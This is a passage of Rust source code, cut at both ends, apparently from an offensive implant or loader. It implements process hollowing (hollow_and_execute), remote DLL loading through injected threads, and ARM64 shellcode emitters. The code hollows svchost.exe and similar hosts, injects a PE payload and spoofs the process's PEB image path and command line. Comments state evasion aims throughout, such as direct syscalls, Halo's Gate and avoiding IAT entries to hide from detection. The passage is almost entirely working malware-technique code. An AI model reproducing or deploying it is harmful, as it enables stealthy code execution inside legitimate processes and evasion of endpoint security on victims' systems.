    let num_names = (*ed).NumberOfNames as usize;
    let names = (module_base + (*ed).AddressOfNames as usize) as *const u32;
    let funcs = (module_base + (*ed).AddressOfFunctions as usize) as *const u32;
    let ords = (module_base + (*ed).AddressOfNameOrdinals as usize) as *const u16;

    for i in 0..num_names {
        let name_ptr = (module_base + (*names.add(i)) as usize) as *const i8;
        let name = CStr::from_ptr(name_ptr).to_bytes();
        if pe_resolve::hash_str(name) != target_hash {
            continue;
        }

        let ord = *ords.add(i) as usize;
        if ord >= (*ed).NumberOfFunctions as usize {
            continue;
        }
        let func_rva = *funcs.add(ord) as usize;
        return local_resolve_export_target_from_rva(
            module_name,
            module_base,
            func_rva,
            export_dir_rva,
            export_dir_size,
            local_modules,
            depth,
        );
    }

    None
}

/// Ensure `dll_name` is loaded in the remote process and return its base.
///
/// Uses `LdrLoadDll` in a suspended remote thread with architecture-specific
/// register setup to pass `(Path, Flags, ModuleFileName, ModuleHandle)`.
#[cfg(windows)]
unsafe fn ensure_remote_module_loaded(
    hprocess: *mut c_void,
    dll_name: &str,
    ldr_load_dll_addr: Option<usize>,
) -> Result<usize> {
    use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
    #[cfg(target_arch = "x86_64")]
    use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT_FULL_AMD64;
    #[cfg(target_arch = "aarch64")]
    use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT_FULL_ARM64;
    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};

    let ldr_addr = ldr_load_dll_addr.ok_or_else(|| {
        anyhow!(
            "fix_iat_remote: NtCreateThreadEx or LdrLoadDll unavailable for deferred DLL load ({})",
            dll_name
        )
    })?;

    let wide_name: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_bytes = wide_name.len() * 2;
    let us_offset = wide_bytes;
    let base_addr_offset = us_offset + std::mem::size_of::<UNICODE_STRING>();
    let total_remote = base_addr_offset + std::mem::size_of::<usize>();

    let mut rb: *mut c_void = std::ptr::null_mut();
    let mut rb_sz = total_remote;
    let alloc_s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        hprocess as u64,
        &mut rb as *mut _ as u64,
        0u64,
        &mut rb_sz as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    )
    .unwrap_or(-1);
    if alloc_s < 0 || rb.is_null() {
        return Err(anyhow!(
            "fix_iat_remote: failed to allocate remote staging block for LdrLoadDll arguments"
        ));
    }

    let remote_block = rb;
    let cleanup_block = || {
        let mut rb2 = remote_block;
        let mut rb2_sz: usize = 0; // MEM_RELEASE ignores size
        let _ = nt_syscall::syscall!(
            "NtFreeVirtualMemory",
            hprocess as u64,
            &mut rb2 as *mut _ as u64,
            &mut rb2_sz as *mut _ as u64,
            NT_MEM_RELEASE as u64,
        );
    };

    let mut wr = 0usize;
    let ws = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        hprocess as u64,
        remote_block as u64,
        wide_name.as_ptr() as u64,
        wide_bytes as u64,
        &mut wr as *mut _ as u64,
    )
    .unwrap_or(-1);
    if ws < 0 {
        cleanup_block();
        return Err(anyhow!(
            "fix_iat_remote: failed to write remote DLL name buffer for LdrLoadDll"
        ));
    }

    let remote_us_ptr = (remote_block as usize + us_offset) as *mut c_void;
    let remote_base_out = (remote_block as usize + base_addr_offset) as *mut c_void;
    let remote_str_va = remote_block as usize;

    let mut remote_us = UNICODE_STRING {
        Length: (wide_bytes.saturating_sub(2)) as u16,
        MaximumLength: wide_bytes as u16,
        Buffer: remote_str_va as *mut u16,
    };

    let us_ws = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        hprocess as u64,
        remote_us_ptr as u64,
        &mut remote_us as *mut _ as u64,
        std::mem::size_of::<UNICODE_STRING>() as u64,
        &mut wr as *mut _ as u64,
    )
    .unwrap_or(-1);
    if us_ws < 0 {
        cleanup_block();
        return Err(anyhow!(
            "fix_iat_remote: failed to write remote UNICODE_STRING for LdrLoadDll"
        ));
    }

    let zero_base: usize = 0;
    let base_ws = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        hprocess as u64,
        remote_base_out as u64,
        &zero_base as *const _ as u64,
        std::mem::size_of::<usize>() as u64,
        &mut wr as *mut _ as u64,
    )
    .unwrap_or(-1);
    if base_ws < 0 {
        cleanup_block();
        return Err(anyhow!(
            "fix_iat_remote: failed to initialize remote output slot for LdrLoadDll"
        ));
    }

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let status = nt_syscall::syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        NT_THREAD_INJECT_ACCESS as u64,
        0u64,
        hprocess as u64,
        ldr_addr as u64,
        remote_us_ptr as u64,
        NT_THREAD_SUSPENDED as u64,
        0u64,
        0u64,
        0u64,
        0u64,
    )
    .unwrap_or(-1);
    if status < 0 || h_thread.is_null() {
        cleanup_block();
        return Err(anyhow!(
            "fix_iat_remote: NtCreateThreadEx for remote LdrLoadDll failed: {:#010x}",
            status as u32
        ));
    }

    let mut ldr_args_configured = false;

    #[cfg(target_arch = "x86_64")]
    {
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL_AMD64;
        let get_ctx = nt_syscall::syscall!(
            "NtGetContextThread",
            h_thread as u64,
            &mut ctx as *mut _ as u64,
        )
        .unwrap_or(-1);
        if get_ctx < 0 {
            pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
            cleanup_block();
            return Err(anyhow!(
                "fix_iat_remote: NtGetContextThread failed while preparing remote LdrLoadDll"
            ));
        }

        // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle)
        ctx.Rcx = 0;
        ctx.Rdx = 0;
        ctx.R8 = remote_us_ptr as u64;
        ctx.R9 = remote_base_out as u64;
        let set_ctx = nt_syscall::syscall!(
            "NtSetContextThread",
            h_thread as u64,
            &ctx as *const _ as u64,
        )
        .unwrap_or(-1);
        if set_ctx >= 0 {
            ldr_args_configured = true;
        }
    }

    #[cfg(target_arch = "aarch64")]
    {
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL_ARM64;
        let get_ctx = nt_syscall::syscall!(
            "NtGetContextThread",
            h_thread as u64,
            &mut ctx as *mut _ as u64,
        )
        .unwrap_or(-1);
        if get_ctx < 0 {
            pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
            cleanup_block();
            return Err(anyhow!(
                "fix_iat_remote: NtGetContextThread failed while preparing remote LdrLoadDll"
            ));
        }

        // Windows ARM64 ABI: X0-X3 = first four integer/pointer arguments.
        let regs = &mut ctx.Anonymous.Anonymous;
        regs.X0 = 0;
        regs.X1 = 0;
        regs.X2 = remote_us_ptr as u64;
        regs.X3 = remote_base_out as u64;
        let set_ctx = nt_syscall::syscall!(
            "NtSetContextThread",
            h_thread as u64,
            &ctx as *const _ as u64,
        )
        .unwrap_or(-1);
        if set_ctx >= 0 {
            ldr_args_configured = true;
        }
    }

    if !ldr_args_configured {
        let _ = nt_syscall::syscall!("NtTerminateThread", h_thread as u64, 0u64);
        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
        cleanup_block();
        return Err(anyhow!(
            "fix_iat_remote: NtSetContextThread failed while preparing remote LdrLoadDll"
        ));
    }

    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
    // 30-second relative timeout (negative i64 in 100ns units) prevents
    // indefinite hang if the remote LdrLoadDll thread stalls.
    let wait_timeout: i64 = -30_000_000_0i64; // -30s in 100ns units
    let _ = nt_syscall::syscall!(
        "NtWaitForSingleObject",
        h_thread as u64,
        0u64,
        &wait_timeout as *const _ as u64,
    );

    let mut loaded_remote_base: usize = 0;
    let mut rd = 0usize;
    let read_s = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        hprocess as u64,
        remote_base_out as u64,
        &mut loaded_remote_base as *mut _ as u64,
        std::mem::size_of::<usize>() as u64,
        &mut rd as *mut _ as u64,
    )
    .unwrap_or(-1);

    pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
    cleanup_block();

    if read_s < 0 || rd != std::mem::size_of::<usize>() {
        return Err(anyhow!(
            "fix_iat_remote: failed to read remote LdrLoadDll base output for {}",
            dll_name
        ));
    }
    if loaded_remote_base == 0 {
        return Err(anyhow!(
            "fix_iat_remote: remote LdrLoadDll reported null module base for {}",
            dll_name
        ));
    }

    Ok(loaded_remote_base)
}

#[cfg(windows)]
unsafe fn ensure_remote_module_loaded_cached(
    hprocess: *mut c_void,
    dll_name: &str,
    ldr_load_dll_addr: Option<usize>,
    remote_modules: &mut std::collections::HashMap<String, usize>,
) -> Result<usize> {
    let key = normalize_dll_name(dll_name);
    if let Some(&base) = remote_modules.get(&key) {
        return Ok(base);
    }

    let base = ensure_remote_module_loaded(hprocess, &key, ldr_load_dll_addr)?;
    remote_modules.insert(key, base);
    Ok(base)
}

// ── ARM64 (AArch64) shellcode helpers ──────────────────────────────────
// Emit position-independent AArch64 instructions for the Windows ARM64
// calling convention: x0–x3 for arguments, x16 (IP0) as the indirect-
// call scratch register, per the Windows ARM64 ABI.

/// Emit a single AArch64 instruction (4 bytes, little-endian).
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_instruction(stub: &mut Vec<u8>, instruction: u32) {
    stub.extend_from_slice(&instruction.to_le_bytes());
}

/// Emit a `MOVZ`/`MOVK` sequence to load a 64-bit immediate into `reg`.
/// Uses four half-word moves (MOVZ for hw0, MOVK for hw1–hw3).
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_mov_imm64(stub: &mut Vec<u8>, reg: u8, value: u64) {
    debug_assert!(reg < 32);
    let rd = (reg as u32) & 0x1f;
    for halfword in 0..4u32 {
        let imm16 = ((value >> (halfword * 16)) & 0xffff) as u32;
        let opcode = if halfword == 0 {
            0xD280_0000 // MOVZXd
        } else {
            0xF280_0000 // MOVKXd
        };
        push_arm64_instruction(stub, opcode | (halfword << 21) | (imm16 << 5) | rd);
    }
}

/// Emit `BLR xN` (branch with link register to address in register N).
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_blr(stub: &mut Vec<u8>, reg: u8) {
    push_arm64_instruction(stub, 0xD63F_0000 | (((reg as u32) & 0x1f) << 5));
}

/// Emit `BR xN` (branch to address in register N, no return).
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_br(stub: &mut Vec<u8>, reg: u8) {
    push_arm64_instruction(stub, 0xD61F_0000 | (((reg as u32) & 0x1f) << 5));
}

/// Emit a Windows ARM64 function call sequence:
///   x0 = image_base, x1 = DLL_PROCESS_ATTACH (1), x2 = 0 (NULL),
///   x16 = target, BLR x16.
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_dll_entry_call(stub: &mut Vec<u8>, target: u64, image_base: u64) {
    push_arm64_mov_imm64(stub, 0, image_base); // x0 = hinstDLL
    push_arm64_mov_imm64(stub, 1, 1); // x1 = DLL_PROCESS_ATTACH
    push_arm64_mov_imm64(stub, 2, 0); // x2 = lpvReserved = NULL
    push_arm64_mov_imm64(stub, 16, target); // x16 = target address
    push_arm64_blr(stub, 16); // blr x16
}

/// Hollow a new suspended process and execute the provided PE payload inside it.
///
/// The host process is chosen from a prioritised candidate list (svchost.exe,
/// RuntimeBroker.exe, dllhost.exe, werfault.exe) so the function does not hard-
/// fail if svchost.exe has been moved or renamed in a hardened environment.
///
/// Process creation uses `CreateProcessW` resolved via PEB-walk (see
/// `create_suspended_process_win32`) rather than the IAT-visible
/// `CreateProcessA`.  All subsequent cross-process operations (memory
/// allocation, read/write, context get/set, resume) also use NT functions
/// resolved through `pe_resolve` to avoid IAT entries.
#[cfg(windows)]
pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
    use std::mem::zeroed;
    use windows_sys::Win32::System::Diagnostics::Debug::{
        IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_OPTIONAL_HDR32_MAGIC,
    };
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    };
    use windows_sys::Win32::System::SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
    };

    // NtClose for handle cleanup via direct syscall.
    macro_rules! close_handle {
        ($h:expr) => {
            let _ = nt_syscall::syscall!("NtClose", $h as u64);
        };
    }

    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
        return Err(anyhow!(
            "hollow_and_execute: payload is not a PE (no MZ header)"
        ));
    }

    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    let e_lfanew = checked_pe_lfanew(payload)?;
    let nt_sig_off = e_lfanew;
    let opt_magic_off = e_lfanew
        .checked_add(4)
        .and_then(|offset| offset.checked_add(std::mem::size_of::<IMAGE_FILE_HEADER>()))
        .ok_or_else(|| anyhow!("hollow_and_execute: OptionalHeader.Magic offset overflow"))?;
    checked_payload_range(payload.len(), opt_magic_off, 2, "OptionalHeader.Magic")?;
    let nt_sig = u32::from_le_bytes(payload[nt_sig_off..nt_sig_off + 4].try_into().unwrap());
    if nt_sig != IMAGE_NT_SIGNATURE {
        return Err(anyhow!("hollow_and_execute: invalid NT signature"));
    }
    let opt_magic = u16::from_le_bytes(
        payload[opt_magic_off..opt_magic_off + 2]
            .try_into()
            .unwrap(),
    );
    if opt_magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC {
        return unsafe { hollow_and_execute_pe32(payload) };
    }

    checked_payload_range(
        payload.len(),
        e_lfanew,
        std::mem::size_of::<IMAGE_NT_HEADERS64>(),
        "NT headers",
    )?;
    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
    unsafe {
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
        }
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid NT signature"));
        }
        let opt_magic = (*nt).OptionalHeader.Magic;
        if opt_magic
            != windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC
        {
            return Err(anyhow!(
                "hollow_and_execute: only PE64 payloads are supported (found OptionalHeader.Magic=0x{:x})",
                opt_magic
            ));
        }

        let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
        let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
        let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
        if image_size == 0 {
            return Err(anyhow!(
                "hollow_and_execute: PE64 payload has SizeOfImage=0"
            ));
        }
        if entry_point_rva >= image_size {
            return Err(anyhow!(
                "hollow_and_execute: PE64 entry point RVA {entry_point_rva:#x} is outside image size {image_size:#x}"
            ));
        }
        checked_payload_range(payload.len(), 0, size_of_headers, "PE64 headers")?;
        if size_of_headers > image_size {
            return Err(anyhow!(
                "hollow_and_execute: PE64 SizeOfHeaders {size_of_headers:#x} exceeds SizeOfImage {image_size:#x}"
            ));
        }

        // Ensure the SSN resolution infrastructure (clean ntdll mapping) is
        // initialised before any direct-syscall dispatch.  Errors are soft:
        // the crate degrades to bootstrap (Halo's Gate) SSN resolution.
        let _ = nt_syscall::init_syscall_infrastructure();

        macro_rules! nt_terminate_process {
            ($h:expr) => {
                let _ = nt_syscall::syscall!("NtTerminateProcess", $h as u64, 1u64);
            };
        }

        // Create the host process using NT direct syscalls.
        let (h_process, h_thread, host_path) = {
            let mut result: Result<(*mut c_void, *mut c_void)> = Err(anyhow!(
                "hollow_and_execute: all host process candidates failed"
            ));
            let mut chosen_path = String::new();
            for path in host_candidate_paths() {
                match create_suspended_process_win32(&path) {
                    Ok(handles) => {
                        chosen_path = path;
                        result = Ok(handles);
                        break;
                    }
                    Err(e) => {
                        tracing::debug!("hollow_and_execute: candidate {} failed: {}", path, e)
                    }
                }
            }
            result.map(|(a, b)| (a, b, chosen_path))?
        };

        // Get PEB address via NtQueryInformationProcess(ProcessBasicInformation=0).
        //
        // PROCESS_BASIC_INFORMATION layout (x64):
        //   +0x00 ExitStatus      4 bytes
        //   +0x08 PebBaseAddress  8 bytes  (4-byte padding before on x64)
        //   total = 48 bytes
        let mut pbi = [0u8; 48];
        let mut ret_len: u32 = 0;
        let s = nt_syscall::syscall!(
            "NtQueryInformationProcess",
            h_process as u64,
            0u64,
            pbi.as_mut_ptr() as u64,
            48u64,
            &mut ret_len as *mut _ as u64,
        )
        .map_err(|e| anyhow!("NtQueryInformationProcess SSN: {e}"))?;
        if s < 0 || ret_len < 16 {
            nt_terminate_process!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute: NtQueryInformationProcess NTSTATUS {:#010x}",
                s as u32
            ));
        }
        let peb_addr = usize::from_le_bytes(pbi[8..16].try_into().unwrap());
        if peb_addr == 0 {
            nt_terminate_process!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!("hollow_and_execute: PEB address is NULL"));
        }
        let peb_ptr = peb_addr as *const u8;

        // Read PEB.ImageBaseAddress (offset 0x10) and unmap the original image.
        let mut remote_image_base: usize = 0;
        let mut rd: usize = 0;
        let read_status = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_process as u64,
            peb_ptr.add(0x10) as u64,
            &mut remote_image_base as *mut _ as u64,
            std::mem::size_of::<usize>() as u64,
            &mut rd as *mut _ as u64,
        );
        if let Err(e) = &read_status {
            nt_terminate_process!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute: NtReadVirtualMemory(PEB.ImageBaseAddress) failed: {}",
                e
            ));
        }
        if let Ok(s) = read_status {
            if s < 0 {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtReadVirtualMemory(PEB.ImageBaseAddress) NTSTATUS {:#010x}",
                    s as u32));
            }
        }
        if remote_image_base != 0 {
            let us = nt_syscall::syscall!(
                "NtUnmapViewOfSection",
                h_process as u64,
                remote_image_base as u64,
            )
            .unwrap_or(-1);
            if us < 0 {
                tracing::warn!(
                    "hollow_and_execute: NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
                    us as u32
                );
            }
        } else {
            tracing::warn!("hollow_and_execute: remote_image_base is NULL; skipping unmap");
        }

        // Allocate payload space (RW; execute applied per-section after write).
        let mut alloc_base = preferred_base as *mut c_void;
        let mut alloc_size = image_size;
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_process as u64,
            &mut alloc_base as *mut _ as u64,
            0u64,
            &mut alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        )
        .unwrap_or(-1);
        let remote_base_ptr = if s < 0 || alloc_base.is_null() {
            let mut fb: *mut c_void = std::ptr::null_mut();
            let mut fb_size = image_size;
            let s2 = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                h_process as u64,
                &mut fb as *mut _ as u64,
                0u64,
                &mut fb_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64,
                PAGE_READWRITE as u64,
            )
            .unwrap_or(-1);
            if s2 < 0 || fb.is_null() {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "NtAllocateVirtualMemory failed: NTSTATUS {:#010x}",
                    s2 as u32
                ));
            }
            fb
        } else {
            alloc_base
        };
        let remote_base = remote_base_ptr as usize;
        let mut written: usize = 0;

        // Write PE headers.
        let s = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64,
            remote_base_ptr as u64,
            payload.as_ptr() as u64,
            size_of_headers as u64,
            &mut written as *mut _ as u64,
        )
        .unwrap_or(-1);
        if s < 0 || written != size_of_headers {
            nt_terminate_process!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "NtWriteVirtualMemory(headers) failed: status={:#010x}, wrote={}, expected={}",
                s as u32,
                written,
                size_of_headers
            ));
        }

        // Write sections.
        let num_sections = (*nt).FileHeader.NumberOfSections as usize;
        let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
        for i in 0..num_sections {
            let sec = &*first_section.add(i);
            let raw_off = sec.PointerToRawData as usize;
            let raw_sz = sec.SizeOfRawData as usize;
            if raw_sz == 0 {
                continue;
            }
            if raw_off == 0 {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: section {} has SizeOfRawData={:#x} but PointerToRawData=0",
                    i,
                    raw_sz
                ));
            }

            let section_rva = sec.VirtualAddress as usize;
            if section_rva >= image_size {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: section {} RVA {:#x} is outside image size {:#x}",
                    i,
                    section_rva,
                    image_size
                ));
            }

            let max_in_image = image_size - section_rva;
            if raw_sz > max_in_image {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: section {} raw size {:#x} exceeds mapped image bounds at RVA {:#x} (remaining {:#x})",
                    i,
                    raw_sz,
                    section_rva,
                    max_in_image
                ));
            }

            let raw_end = match raw_off.checked_add(raw_sz) {
                Some(v) => v,
                None => {
                    nt_terminate_process!(h_process);
                    close_handle!(h_thread);
                    close_handle!(h_process);
                    return Err(anyhow!(
                        "hollow_and_execute: section {} raw range overflow (offset={:#x}, size={:#x})",
                        i,
                        raw_off,
                        raw_sz
                    ));
                }
            };
            if raw_end > payload.len() {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: section {} raw range [{:#x}, {:#x}) exceeds payload size {:#x}",
                    i,
                    raw_off,
                    raw_end,
                    payload.len()
                ));
            }

            let copy_sz = raw_sz;
            let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
            let s = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                h_process as u64,
                dst as u64,
                payload.as_ptr().add(raw_off) as u64,
                copy_sz as u64,
                &mut written as *mut _ as u64,
            )
            .unwrap_or(-1);
            if s < 0 || written != copy_sz {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "NtWriteVirtualMemory(section {}) failed: status={:#010x}, wrote={}, expected={}",
                    i,
                    s as u32,
                    written,
                    copy_sz
                ));
            }
        }

        let delta = remote_base as isize - preferred_base as isize;
        if delta != 0 {
            let reloc_dir = &(*nt).OptionalHeader.DataDirectory
                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_BASERELOC
                    as usize];
            if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: preferred base unavailable and PE has no reloc directory"
                ));
            }
            apply_relocations_remote(h_process, remote_base, nt, payload, delta)?;
        }

        // Resolve and write the Import Address Table.
        fix_iat_remote(h_process, remote_base, nt, payload, &mut written)?;

        // Apply per-section execute/write permissions.
        apply_section_protections(h_process, remote_base, nt);

        // Flush instruction cache for the newly written image.
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_process as u64,
            remote_base_ptr as u64,
            (*nt).OptionalHeader.SizeOfImage as u64,
        );

        // Update PEB.ImageBaseAddress.
        let peb_write_status = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64,
            peb_ptr.add(0x10) as u64,
            &remote_base as *const _ as u64,
            std::mem::size_of::<usize>() as u64,
            &mut written as *mut _ as u64,
        );
        match peb_write_status {
            Ok(s) if s >= 0 => {}
            Ok(s) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtWriteVirtualMemory(PEB.ImageBaseAddress) NTSTATUS {:#010x}",
                    s as u32));
            }
            Err(e) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtWriteVirtualMemory(PEB.ImageBaseAddress) failed: {}",
                    e
                ));
            }
        }

        // ── Update PEB ProcessParameters (ImagePathName / CommandLine) ───────
        // After replacing the image, update the RTL_USER_PROCESS_PARAMETERS so
        // that the hollowed process reports the host process path when queried
        // via PEB walk.  This keeps the process appearance consistent with the
        // host executable that was used to create the suspended process.
        //
        // PEB (x64) layout:
        //   +0x20  ProcessParameters  (pointer to RTL_USER_PROCESS_PARAMETERS)
        //
        // RTL_USER_PROCESS_PARAMETERS (x64) layout:
        //   +0x60  ImagePathName      (UNICODE_STRING: Length, MaxLength, Buffer)
        //   +0x70  CommandLine        (UNICODE_STRING: Length, MaxLength, Buffer)
        //
        // UNICODE_STRING (x64) = { Length: u16, MaxLength: u16, _pad: u32, Buffer: *mut u16 }
        //   total = 16 bytes on x64
        {
            const PEB_PROCESS_PARAMETERS_OFFSET_X64: usize = 0x20;
            const RTL_IMAGE_PATH_OFFSET_X64: usize = 0x60;
            const RTL_COMMAND_LINE_OFFSET_X64: usize = 0x70;

            let us_size = std::mem::size_of::<UNICODE_STRING>();
            let min_params_span = RTL_COMMAND_LINE_OFFSET_X64 + us_size;

            // Read the ProcessParameters pointer from PEB+0x20.
            let mut params_ptr: usize = 0;
            let params_ok = nt_read_exact(
                h_process,
                peb_ptr.add(PEB_PROCESS_PARAMETERS_OFFSET_X64) as usize,
                &mut params_ptr as *mut _ as *mut c_void,
                std::mem::size_of::<usize>(),
            );
            if !params_ok || params_ptr == 0 {
                tracing::warn!(
                    "hollow_and_execute: failed to read PEB.ProcessParameters, skipping update"
                );
            } else if !remote_region_covers(h_process, params_ptr, min_params_span, false) {
                tracing::warn!(
                    "hollow_and_execute: ProcessParameters pointer {:p} does not cover required layout span, skipping update",
                    params_ptr as *const c_void
                );
            } else {
                let image_us_addr = params_ptr + RTL_IMAGE_PATH_OFFSET_X64;
                let cmd_us_addr = params_ptr + RTL_COMMAND_LINE_OFFSET_X64;

                let mut image_us: UNICODE_STRING = std::mem::zeroed();
                let mut cmd_us: UNICODE_STRING = std::mem::zeroed();

                let image_us_ok = nt_read_exact(
                    h_process,
                    image_us_addr,
                    &mut image_us as *mut _ as *mut c_void,
                    us_size,
                );
                let cmd_us_ok = nt_read_exact(
                    h_process,
                    cmd_us_addr,
                    &mut cmd_us as *mut _ as *mut c_void,
                    us_size,
                );

                if !image_us_ok || !cmd_us_ok {
                    tracing::warn!(
                        "hollow_and_execute: could not read existing ProcessParameters UNICODE_STRING entries, skipping update"
                    );
                } else {
                    let wide_path = dos_to_nt_path(&host_path);
                    let full_len_bytes = wide_path.len().saturating_mul(2);
                    let path_len_bytes = full_len_bytes.saturating_sub(2); // exclude trailing NUL

                    if full_len_bytes > u16::MAX as usize || path_len_bytes > u16::MAX as usize {
                        tracing::warn!(
                            "hollow_and_execute: host path too long for UNICODE_STRING ({} bytes), skipping ProcessParameters update",
                            full_len_bytes
                        );
                    } else {
                        let is_usable_buffer = |us: &UNICODE_STRING| {
                            us.Buffer as usize != 0
                                && us.MaximumLength >= us.Length
                                && us.MaximumLength as usize >= full_len_bytes
                                && remote_region_covers(
                                    h_process,
                                    us.Buffer as usize,
                                    us.MaximumLength as usize,
                                    true,
                                )
                        };

                        let mut target_buf: *mut u16 = std::ptr::null_mut();
                        if is_usable_buffer(&image_us) {
                            target_buf = image_us.Buffer;
                        } else if is_usable_buffer(&cmd_us) {
                            target_buf = cmd_us.Buffer;
                        } else {
                            let mut str_buf: *mut c_void = std::ptr::null_mut();
                            let mut str_buf_sz: usize = (full_len_bytes + 63) & !63;
                            if str_buf_sz == 0 {
                                str_buf_sz = 64;
                            }
                            let alloc_status = nt_syscall::syscall!(
                                "NtAllocateVirtualMemory",
                                h_process as u64,
                                &mut str_buf as *mut _ as u64,
                                0u64,
                                &mut str_buf_sz as *mut _ as u64,
                                (MEM_COMMIT | MEM_RESERVE) as u64,
                                PAGE_READWRITE as u64,
                            )
                            .unwrap_or(-1);
                            if alloc_status < 0
                                || str_buf.is_null()
                                || !remote_region_covers(
                                    h_process,
                                    str_buf as usize,
                                    full_len_bytes,
                                    true,
                                )
                            {
                                tracing::warn!(
                                    "hollow_and_execute: failed to provision validated remote string buffer for ProcessParameters update"
                                );
                            } else {
                                target_buf = str_buf as *mut u16;
                            }
                        }

                        if !target_buf.is_null() {
                            let path_written = nt_write_exact(
                                h_process,
                                target_buf as usize,
                                wide_path.as_ptr() as *const c_void,
                                full_len_bytes,
                            );
                            if !path_written {
                                tracing::warn!(
                                    "hollow_and_execute: failed to write validated ProcessParameters path buffer"
                                );
                            } else {
                                let new_us = UNICODE_STRING {
                                    Length: path_len_bytes as u16,
                                    MaximumLength: full_len_bytes as u16,
                                    Buffer: target_buf,
                                };

                                let wrote_image = nt_write_exact(
                                    h_process,
                                    image_us_addr,
                                    &new_us as *const _ as *const c_void,
                                    us_size,
                                );
                                let wrote_cmd = nt_write_exact(
                                    h_process,
                                    cmd_us_addr,
                                    &new_us as *const _ as *const c_void,
                                    us_size,
                                );

                                if wrote_image && wrote_cmd {
                                    tracing::debug!(
                                        "hollow_and_execute: updated validated ProcessParameters ImagePathName/CommandLine to {}",
                                        host_path
